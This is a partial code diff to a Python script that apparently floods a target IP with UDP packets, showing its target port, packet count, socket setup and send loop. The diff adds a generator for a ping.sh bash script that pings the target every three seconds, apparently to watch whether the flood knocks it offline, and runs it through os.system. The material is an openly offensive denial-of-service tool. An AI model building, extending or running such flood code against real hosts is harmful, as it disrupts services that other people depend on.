@@ -1,4 +1,25 @@
 import socket
+import os 
+
+
+def makebash(ip_address):
+    bash_script_name = "ping.sh"
+    bash_script_content = f"""#!/bin/bash
+while true; do
+    ping -c 1 {ip_address}
+    sleep 3
+done
+"""
+    
+    with open(bash_script_name, 'w') as bash_file:
+        bash_file.write(bash_script_content)
+    
+    os.chmod(bash_script_name, 0o755)
+    
+    print(f"Bash script '{bash_script_name}' created to ping {ip_address} every 3 seconds. Run ./ping.sh in a seperate window to monitor.")
+
+def execute_bash_script():
+    os.system('./ping.sh')
 
 def color_red(text):
     RED = "\033[91m" 
@@ -35,6 +56,10 @@ print(color_red("UDP target port: %s" % UDP_PORT))
 print(color_red("Message size: %s bytes" % packet_size))
 print(color_red("Number of packets to send: %s" % amount))
 
+user_ip = UDP_IP
+    
+makebash(user_ip)
+    
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 for i in range(amount):
